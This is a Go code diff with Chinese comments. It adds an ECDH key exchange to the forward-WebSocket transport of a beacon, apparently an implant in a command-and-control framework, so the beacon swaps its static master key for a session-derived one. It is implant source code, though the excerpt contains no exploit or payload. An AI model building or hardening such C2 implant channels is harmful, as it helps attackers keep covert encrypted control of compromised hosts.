@@ -90,7 +90,11 @@ func (c *WSForwardClient) Connect(spec string) error {
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
-		conn, err := c.upgrader.Upgrade(w, r, nil)
+		// 会话前 ECDH 交换（场景与反向 ws 相反：这里 **C2 是拨号方**，
+		// beacon 是 upgrader）。所以 beacon 在升级请求里读 C2 的公钥、
+		// 派生主密钥，并通过升级响应头把自己的公钥回给 C2。
+		kxHeader, derivedMK := c.kxRespond(r)
+		conn, err := c.upgrader.Upgrade(w, r, kxHeader)
 		if err != nil {
 			select {
 			case c.connectedCh <- err:
@@ -101,6 +105,14 @@ func (c *WSForwardClient) Connect(spec string) error {
 		c.Connection = conn
 		c.connected = true
 		debuglog.Printf("✅ [WS-FORWARD] 服务端连入: %s\n", conn.RemoteAddr())
+
+		// 交换成功则替换静态主密钥，并作废用静态密钥生成的旧 MetaInfo
+		if len(derivedMK) > 0 {
+			if rerr := encrypt.GlobalClientKeyManager.ReplaceMasterKey(derivedMK); rerr == nil {
+				utils.MetaInfo = nil
+				debuglog.Printf("🔑 [WS-FWD-KX] 会话前密钥交换完成，已替换静态主密钥\n")
+			}
+		}
 
 		// MetaInfo + FirstBlood
 		if len(utils.MetaInfo) == 0 {
@@ -256,4 +268,34 @@ func (c *WSForwardClient) Close() error {
 		c.Listener = nil
 	}
 	return nil
+}
+
+// kxRespond 处理 C2 拨号时带来的 X-Kx 头，返回（要回给 C2 的响应头, 派生主密钥）。
+//
+// 与反向 ws 的差别：那边是 beacon 读响应头取公钥，这边是 beacon 读**请求头**、
+// 并把公钥放进**响应头**。失败时返回空头与 nil —— C2 会回落静态密钥，
+// 保持与"老版本不支持 ECDH"一致的行为。
+func (c *WSForwardClient) kxRespond(r *http.Request) (http.Header, []byte) {
+	hdr := http.Header{}
+	raw := r.Header.Get(encrypt.KxHeaderName)
+	if raw == "" {
+		return hdr, nil
+	}
+	peerPub, err := encrypt.ParsePeerPublicKey(raw)
+	if err != nil {
+		debuglog.Printf("⚠️ [WS-FWD-KX] C2 公钥不可用: %v\n", err)
+		return hdr, nil
+	}
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return hdr, nil
+	}
+	salt, _ := app.GetListenerKeyConfig(listenerType)
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		debuglog.Printf("⚠️ [WS-FWD-KX] 派生失败: %v\n", err)
+		return hdr, nil
+	}
+	hdr.Set(encrypt.KxHeaderName, kx.HeaderValue())
+	return hdr, masterKey
 }
